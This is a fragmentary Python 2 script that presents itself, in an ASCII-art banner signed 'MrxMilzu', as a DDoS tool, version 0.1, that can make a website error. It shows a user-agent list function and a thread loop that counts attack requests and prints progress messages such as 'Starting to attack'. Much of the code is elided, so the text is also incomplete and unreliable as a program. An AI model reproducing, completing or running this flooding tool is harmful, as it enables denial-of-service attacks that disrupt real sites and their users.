...
# generates a user agent arrayarray
# 
def ua_list():
...
"""                        .
     ...
     |  .-----------------.  |   |   Author : MrxMilzu
     |  |                   |  |   |   DDOS : v0.1
     |  |                   |  |   |   ABOUT: This type of DDOS is included in the mild category 
     |  |                   |  |   |   but little by little the effect will be dangerous and can even error '404'
     |  |                   |  |   |   Note From User : 
     |  |                   |  |   |   i suggest reading this detail first until it's finished before using it !!
     |  `-----------------'  |  /
     +--------------------+/
 From Developer: Script has started!
"""
print '---------------------------------------------------'
	...
	def run(self):
		...
		while flag==0:
			if (previous+100<request_counter) & (previous<>request_counter):
				print "%d (= Starting to attack Wait... =}" % (request_counter)
				previous=request_counter
		if flag==2:
			print "\n -Fall and not get up"
